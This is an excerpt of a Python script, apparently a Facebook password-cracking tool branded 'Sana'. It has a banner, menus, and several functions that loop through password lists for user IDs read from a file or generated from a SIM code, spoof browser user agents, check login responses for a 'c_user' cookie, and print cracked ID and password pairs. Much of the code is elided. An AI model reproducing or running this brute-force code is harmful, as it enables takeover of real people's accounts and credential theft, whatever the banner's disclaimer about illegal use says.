...
------------------------------------------------×
[!] Author \x1b[1;97m      :        Sana Khan
[!] Facebook\x1b[1;97m  :        Sana Queen 
[!] Tool type\x1b[1;97m   :        Free   
[!] Version\x1b[1;97m     :         0.2
------------------------------------------------×""
""/33[101m This Tool is free so don't use illegal 
--------------------------------------------------""")
def linex():
	print('\033[0;97m------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\033[0;97m>>> SANA  VERSION :\033[0;97m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Sana.txt')
				linex()
				file = input(' Put file path\033[0;97m: ')
				try:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[Sana] %s|\033[0;92mOK:-%s \033[0;92m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[0;97m[Sana-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Sana-OK] '+ids+' | '+pas+'\033[0;92m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[Sana] %s|\033[0;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[0;92m[Sana-OK] %s | %s'%(ids,pas))
...
def menu():
	...
	if opt =='1':
		...
		print('\n\033[0;97mChoose valid option\033[0;97m')
		menu()
#____
def random_number1():
	uid=[]
	...
	linex()
	kode = input('[+]\033[0;97m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mSana\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarybzvVrdDsYoMyCQR3',
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5369.184 Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Sana-CP] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Sana-OK] '+cid+' | '+ps+'\033[0;92m')
